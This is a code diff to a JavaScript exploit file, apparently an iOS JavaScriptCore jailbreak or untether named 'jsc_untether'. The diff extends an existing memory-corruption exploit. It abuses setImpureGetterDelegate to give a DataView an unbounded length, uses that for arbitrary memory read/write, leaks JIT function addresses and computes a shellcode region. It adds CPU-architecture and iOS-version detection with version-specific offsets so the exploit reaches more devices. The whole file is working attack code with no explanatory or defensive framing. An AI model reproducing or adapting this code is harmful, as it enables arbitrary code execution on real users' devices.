@@ -20,7 +20,32 @@ var Utils = function() {
     }
 
     this.quit_jsc = function() {
-        var quit = JSC_HAXX;
+        try {
+            quit();
+        } catch(err) {
+            var quit = JSC_HAXX;
+        }
+    }
+
+    this.get_cpu_arch = function() {
+        var output = describe(debug);
+        var addr = output.match(/0x[0-9a-fA-F]+/);
+    
+        if (addr != 0) {
+            var addr_len = addr[0].length - 2;
+            if (addr_len >= 8) return "arm64";
+            return "armv7";
+        }
+        return "unknown";
+    }
+
+    this.get_ios_version = function() {
+        try {
+            gcHeapSize(); // only exist on ios 9+
+            return 9
+        } catch(err) {
+            return 8;
+        }
     }
 }
 
@@ -33,7 +58,7 @@ var dv_rw = new DataView(rw_buf);
 setImpureGetterDelegate(dv_init, dv_rw);
 
 dv_init.setUint32(DV_ARRAYBUFFER_OFFSET, 0, true);
-dv_init.setUint32(DV_BYTELENGTH_OFFSET, 0xFFFFFFFF, true);
+dv_init.setUint32(DV_BYTELENGTH_OFFSET, 0xffffffff, true);
 dv_init.setUint32(DV_MODE_OFFSET, 0, true);
 
 var rw_buf = new ArrayBuffer(0x20);
@@ -42,36 +67,59 @@ var dv_leak = new DataView(rw_buf);
 setImpureGetterDelegate(dv_leak, dv_leak_addr);
 
 var body = '';
-for (var k = 0; k < 0x100; k++){
+for (var i = 0; i < 0x100; i++){
     body += 'try {} catch(e){};';
 }
+
 var jit_func1 = new Function('a', body);
 for (var i = 0; i< 0x10000; i++){
     jit_func1();
 }
 
-util.print("[*] jsc_haxx (32bit) [*]");
+var cpu_arch = util.get_cpu_arch();
+var ios_version = util.get_ios_version();
+
+util.print("[*] jsc_untether [*]");
+util.print("cpu arch: " + cpu_arch);
+util.print("ios version: " + ios_version);
+
 setImpureGetterDelegate(dv_leak_addr, jit_func1);
 jit_addr1 = dv_leak.getUint32(DV_ARRAYBUFFER_OFFSET, true);
 util.print("jit_addr1: " + util.hex32(jit_addr1));
+var shellcode = 0;
 
-var shellcode_ptr = mem.read32(jit_addr1+0x14);
-util.print("shellcode_ptr: " + util.hex32(shellcode_ptr));
+if (ios_version >= 9) {
+    var shellcode_ptr = mem.read32(mem.read32(mem.read32(jit_addr1))+0x38);
+    if (shellcode_ptr >= 0xfffff) {
+        shellcode = mem.read32(shellcode_ptr+0xfc); // ios 9.0-9.2.1
+        if (shellcode < 0xfffffff) shellcode = mem.read32(shellcode_ptr+0xcc); // ios 9.3-9.3.1
+    }
 
-var shellcode = (mem.read32(shellcode_ptr+0x20)&0xfffff000)+0xa0000;
-util.print("shellcode: " + util.hex32(shellcode));
+    // ios 9.3.2+
+    if (shellcode < 0xfffffff) {
+        var shellcode_ptr = mem.read32(jit_addr1+0x14);
+        shellcode = (mem.read32(shellcode_ptr+0x18)&0xfffff000)+0x80000;
+    }
+
+    util.print("shellcode_ptr: " + util.hex32(shellcode_ptr));
+    util.print("shellcode: " + util.hex32(shellcode));
+} else {
+    var shellcode_ptr = mem.read32(jit_addr1+0x14);
+    util.print("shellcode_ptr: " + util.hex32(shellcode_ptr));
+    shellcode = (mem.read32(shellcode_ptr+0x20)&0xfffff000)+0x80000;
+    util.print("shellcode: " + util.hex32(shellcode));
+}
 
 var body = '';
-for (var k = 0; k < 0x100; k++){
+for (var i = 0; i < 0x100; i++) {
     body += 'try {} catch(e){};';
 }
 
 var jit_func2 = new Function('a', body);
-for (var i = 0; i< 0x10000; i++){
+for (var i = 0; i< 0x10000; i++) {
     jit_func2();
 }
 
 setImpureGetterDelegate(dv_leak_addr, jit_func2);
 jit_addr2 = dv_leak.getUint32(DV_ARRAYBUFFER_OFFSET, true);
 util.print("jit_addr2: " + util.hex32(jit_addr2));
-
